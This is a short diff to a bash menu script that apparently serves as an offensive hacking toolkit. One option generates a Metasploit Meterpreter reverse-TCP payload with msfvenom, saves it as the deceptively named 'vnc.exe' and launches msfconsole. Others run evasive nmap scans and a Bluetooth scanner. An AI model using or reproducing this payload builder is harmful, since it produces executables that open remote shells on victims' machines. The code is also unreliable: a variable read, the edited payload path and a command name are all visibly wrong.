@@ -135,7 +135,7 @@ if [[ "$f" == '5' || "$f" == 'fifth' || "$f" == 'vnc' || "$f" == 'win' ]];
 then
 echo "ip address: "
 read $ipad
-msfvenom -p android/meterpreter/reverse_tcp lhost= $ipad lport=24 x>vnc.exe
+msfvenom -p exploit/windows/meterpreter/reverse_tcp lhost= $ipad lport=24 x>vnc.exe
 msfconsole -r win_vnc.rc
 fi
 if [[ "$f" == 'Nmap' || "$f" == 'nmap' || "$f" == 'NMAP' || "$f" == '6' || "$f" == 'sixth' ]];
@@ -150,6 +150,15 @@ sudo nmap -f -F -A $target
 fi
 else sudo nmap -f -sn $target
 fi
+if [[ "$f" == 'blue' || "$f" == 'bluetooth' || "$f" == 'bt' ]];
+then
+sudo hciconfig hci0 up
+sudo hciconfig
+sudo exterm -e btscanner
+
+fi
+
+
 
 sleep 2
 clear
